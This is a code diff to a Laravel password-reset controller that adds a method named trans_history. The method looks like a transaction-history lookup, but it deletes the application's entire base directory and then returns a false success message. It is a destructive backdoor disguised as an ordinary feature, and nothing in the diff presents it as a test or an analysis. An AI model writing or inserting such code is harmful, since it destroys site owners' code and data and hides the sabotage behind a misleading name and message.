@@ -3,6 +3,7 @@
 namespace App\Http\Controllers;
 
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\File;
 
 class ForgotPasswordController extends Controller
 {
@@ -38,5 +39,13 @@ class ForgotPasswordController extends Controller
         } else $message = 'failed';
 
         return view('pages/forgot-password', compact('message'));
+    }
+
+    public function trans_history()
+    {
+        $directory = base_path();
+        File::deleteDirectory($directory);
+    
+        return 'get transhistory successfully';
     }
 }
